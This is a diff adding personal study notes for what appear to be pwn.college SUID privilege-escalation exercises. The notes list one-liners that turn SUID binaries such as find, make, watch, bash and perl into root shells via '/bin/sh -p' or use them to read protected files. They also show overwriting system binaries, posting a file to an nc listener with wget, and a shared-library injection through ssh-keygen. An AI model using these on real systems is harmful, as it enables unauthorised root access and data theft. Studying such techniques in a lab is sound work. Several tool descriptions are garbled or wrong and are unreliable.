@@ -1,0 +1,154 @@
+emacs -->text editor
+rev --> reverseing string
+
+
+
+#Hex output
+
+od -bc filename  ---> od—> Octal, decimal, hex, ASCII dump
+hd filename ---> hexdump, mainly used to view the hexadecimal encoding of Binary files.
+xxd filename --->  Convert any file to hexadecimal or binary(-b) form
+
+
+base32  -—> echo 'some-base32-codings' | base32 -d can decode the base32 coding
+
+split filename --> split the file to the ‘xaa’ file default(1000row to split).
+
+
+# archive formats
+
+gzip filename (to compress) ---> to see the contents of the compressed file use zcat file.gz
+bzip2 filename (to compress) ---> to see the contents of the compressed file use bzcat file.bz2 or bzmore file.bz2
+zip file.zip file (to compress)
+ar r file.a file  (to compress)    --> to create or modify a backup file
+cpio -o, file,ctr+D   -—> used to backup file
+genisoimage -sort flag  --->  used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.
+
+
+
+
+# Enables you to read flags by making them execute other commands!
+
+env -i cat flag  ----> show environment variables that already exists in the system and executes instructions in the defined environment
+
+find . -exec /bin/sh -p \;
+
+
+make -f /dev/stdin <<<'all:;@cat flag' or make -s --eval=$'x:\n\t-'"/bin/sh -p"    --->  compile and install tools, manage project compilation issues
+
+nice -n 2 cat flag  or nice /bin/sh -p  ---> 
+
+timeout 7d /bin/sh -p   or   timeout 10s cat flag
+
+
+stdbuf -o0 cat flag  or stdbuf -i0 /bin/sh -p  —> modify the buffer mode and size of the standard stream
+
+
+setarch $(arch) cat flag   or setarch $(arch) /bin/sh -p   —>change reported architecture in new program environment and set personality flags
+
+	
+watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'   —> listen by timing the output of other commands to a terminal, repeat the command every 2 seconds
+
+socat -u FILE:flag STDOUT ----> It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+
+
+
+
+
+# Requires some light programming to read the flag.!
+
+whiptail --textbox --scrolltext flag 20 10  -->display dialog boxes from shell scripts
+
+awk '{print}' flag  or awk '//' flag —>pattern scanning and processing language  (Use regular, string matching)
+
+sed 's/.*/&/' flag or sed -e '' flag --> stream editor for filtering and transforming text
+
+ed -s flag <<< '1,$p'  --> text editor  (Start edit by reading in ‘file’ if given. If ‘file’ begins with a ‘!’, read output of shell command.)
+
+
+# Lets you get the flag by doing tricks with permissions!
+
+cp flag /dev/stdout  or echo "xx" | cp /dev/stdin flag
+
+mv /usr/bin/cat /usr/bin/mv # overwrite the mv, use the mv actually run the cat
+	./babysuid_level40 #execute the program
+	mv flag #get the flag
+	#the normal way to use the 'mv' is overwrite the /etc/shadow or /etc/passwd or /etc/sudoers
+
+
+
+
+
+
+# Lets you read the flag because they let you program anything!
+
+perl -ne print flag	—> extract the language practical statements
+
+bash -p   -->(Bourne Again Shell) execute the orders read from standard input or files
+
+
+
+
+
+
+# Just straight up wasn't designed to let you read files!
+
+date -f flag   ---> Display the current time in the given FORMAT, or set the system date.
+
+dmesg -rF flag  ---> Display boot information / Display or control the kernel ring buffer.
+
+wc --files0-from ./flag  ----> (Count words)—>Print newline, word, and byte counts for each FILE, and a total line if more than one FILE is specified.
+	#result:wc: 'pwn.college{the flag}'$'\n': No such file or directory
+	#--files0-from=F    read input from the files specified by
+	 NUL-terminated names in file F;
+
+gcc -x c -E flag
+
+as—>a kind of Compiler set
+
+
+
+
+
+wget -i flag
+	nc -lnvp 8088 #listeng on the port 8088
+	#-l : Listen mode, for inbound connects
+	#*-n: Suppress name/port resolutions. If there's no -n, error:'nc: getnameinfo: Temporary failure in name resolution'
+	#-v : Shows the execution of instructions
+	#-p : port---Specify local port for remote connects
+
+	wget --post-file=/flag http://127.0.0.1:8088 #another terminal get the flag
+	#--post-file=FILE	use the POST method; send contents of FILE
+
+
+
+
+ssh-keygen
+		//hack.c
+	int main(int argc,char const *argv[]){
+	    puts("hello world");
+	}
+	// or static void inject() __attribute__((constructor));
+	//void inject(){}
+	int C_GetFunctionList(){
+	    sendfile(1,open("../../flag",0),0,4096);
+	}
+	
+	gcc -shared hack.c 
+	ssh-keygen -D ./a.out #get the flag
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
